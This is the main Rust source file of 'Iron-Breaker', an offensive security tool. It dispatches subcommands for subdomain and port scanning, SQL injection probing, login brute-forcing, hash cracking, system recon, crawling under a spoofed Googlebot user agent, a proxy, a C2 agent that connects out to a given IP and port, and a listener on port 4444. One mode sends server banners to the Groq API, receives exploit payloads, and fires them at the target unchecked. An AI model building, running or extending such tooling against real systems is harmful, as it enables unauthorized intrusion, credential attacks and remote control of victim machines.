use clap::{Parser, Subcommand};
use reqwest::Client;
use std::net::IpAddr;
use ipnet::IpNet;
use tokio::time::Duration;
use tokio::net::TcpStream;

mod ai;
mod report;
mod subdomain;
mod ports;
mod web_attacks;
mod cracker;
mod recon;
mod spider;
mod proxy;
mod c2;
mod listener;



#[derive(Parser)]
#[command(author = "sh4lu_z", version = "3.0", about = "Iron-Breaker: Modular Security Suite")]
struct Args {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    /// 1. Intelligence Scan (Subdomains + AI + Smart Fuzzing)
    Scan {
        target: String,
        #[arg(long)]
        groq_key: Option<String>,
        #[arg(short, long, default_value = "80,443,8080,3000")]
        ports: String,
        #[arg(short, long, default_value_t = 50)]
        concurrency: usize,
    },
    
    /// 2. Deep Port Scanning (1-5000 range)
    Ports {
        target: String, 
        #[arg(short, long, default_value_t = 100)]
        concurrency: usize,
    },

    Crack {
        hash: String,
        #[arg(short, long, default_value = "wordlist.txt")]
        wordlist: String,
    },

    /// 3. Web Attacks (SQLi & Login Brute-force)
    Web {
        target: String,
        #[arg(long, default_value = "admin")]
        user: String,
    },
    Recon,

    Spider {
        target: String,
    },

    Proxy {
        #[arg(long, default_value_t = 8080)]
        listen: u16,
        #[arg(long)]
        target: String, // උදා: testphp.vulnweb.com:80
    },

    C2 {
        #[arg(long)]
        ip: String, 
        #[arg(long)]
        port: u16,  
    },

    Listen {
        #[arg(long, default_value_t = 4444)]
        port: u16,
    },
}

#[tokio::main]
async fn main() {
    let args = Args::parse();

    match args.command {
        // --- MODE 1: INTELLIGENCE SCAN
        Commands::Scan { target, groq_key, ports, concurrency } => {
            println!("🚀 Mode: Intelligence Scan on {}", target);
            
            // 1. Subdomain Scanning
            if !target.contains("/") {
                let subdomains = subdomain::find_subdomains(&target).await;
                let target_ports: Vec<u16> = ports.split(',').map(|p| p.parse().unwrap_or(80)).collect();

                for (domain, ips) in subdomains {
                    println!("   🔍 Target: {} -> IPs: {:?}", domain, ips);
                    
                    for ip_str in ips {
                         if let Ok(ip) = ip_str.parse::<IpAddr>() {
                            // AI Strategy
                            if let Some(key) = &groq_key {
                                let info = format!("Subdomain: {}, IP: {}, Service: HTTP", domain, ip);
                                let k = key.clone();
                                let d = domain.clone();
                                tokio::spawn(async move {
                                    let strat = ai::suggest_exploit(&k, &info).await;
                                    println!("\n    🤖 AI STRATEGY for {}:\n{}\n", d, strat);
                                });
                            }

                            // Smart Port Scan & Attack
                            for port in &target_ports {
                                let k = groq_key.clone();
                                scan_smart_port(ip, *port, concurrency, k).await;
                            }
                         }
                    }
                }
            } else {
                 // URLAttack
                 println!("   [!] Direct URL detected. Starting analysis...");
                 // Web Attack 
                 let client = Client::builder().danger_accept_invalid_certs(true).build().unwrap();
                 web_attacks::check_sqli(&client, &target).await;
            }
        }

        // --- MODE 2: DEEP PORT SCAN ---
        Commands::Ports { target, concurrency } => {
            if let Ok(ip) = target.parse::<IpAddr>() {
                ports::scan_full_range(ip, concurrency).await;
            } else {
                println!("❌ Error: Invalid IP address.");
            }
        }

        // --- MODE 3: WEB EXPLOITATION ---
        Commands::Web { target, user } => {
            println!("☠️ Mode: Web Exploitation on {}", target);
            let client = Client::builder()
                .danger_accept_invalid_certs(true)
                .user_agent("Iron-Breaker/3.0")
                .timeout(Duration::from_secs(10))
                .build().unwrap();

            web_attacks::check_sqli(&client, &target).await;
            web_attacks::brute_force_login(&client, &target, &user).await;
        }
        
        Commands::Crack { hash, wordlist } => {
            cracker::crack_hash(&hash, &wordlist);
        }

        Commands::Recon => {
            recon::run_system_recon();
        }

        Commands::Spider { target } => {
            let client = Client::builder()
                .danger_accept_invalid_certs(true)
                .user_agent("Googlebot/2.1") 
                .build().unwrap();
            
            spider::crawl(&client, &target).await;
        }

        Commands::Proxy { listen, target } => {
            // Proxy
            let _ = proxy::start_proxy(listen, target).await;
        }

        Commands::C2 { ip, port } => {
            // Agent 
            c2::start_agent(ip, port).await;
        }

        Commands::Listen { port } => {
            listener::start_server(port).await;
        }
        
    }
    
    println!("\n🔥 Operation Completed!");
}

// --- Helper Functions for Smart Scan 

async fn scan_smart_port(ip: IpAddr, port: u16, _conc: usize, api_key: Option<String>) {
    let address = format!("{}:{}", ip, port);
    if let Ok(Ok(_)) = tokio::time::timeout(Duration::from_secs(1), TcpStream::connect(&address)).await {
        println!("    [+] Port {} is OPEN on {}!", port, ip);
        
        if port == 80 || port == 443 || port == 8080 {
            let protocol = if port == 443 { "https" } else { "http" };
            let url = if ip.is_ipv6() { format!("{}://[{}]", protocol, ip) } else { format!("{}://{}", protocol, ip) };
            
            let client = Client::builder().danger_accept_invalid_certs(true).timeout(Duration::from_secs(5)).build().unwrap();
            
            // Server Version
            if let Ok(resp) = client.get(&url).send().await {
                let banner = resp.headers().get("server").and_then(|h| h.to_str().ok()).unwrap_or("Unknown");
                println!("    [i] Service Banner: {}", banner);

                if let Some(key) = api_key {
                    if let Ok(attacks) = ai::ask_groq(&key, banner).await {
                         for attack in attacks {
                             println!("    🔥 AI PAYLOAD: {}", attack.payload);
                             // Payload 
                             let full_url = format!("{}/{}", url, attack.payload);
                             let _ = client.get(&full_url).send().await;
                         }
                    }
                }
            }
        }
    }
}
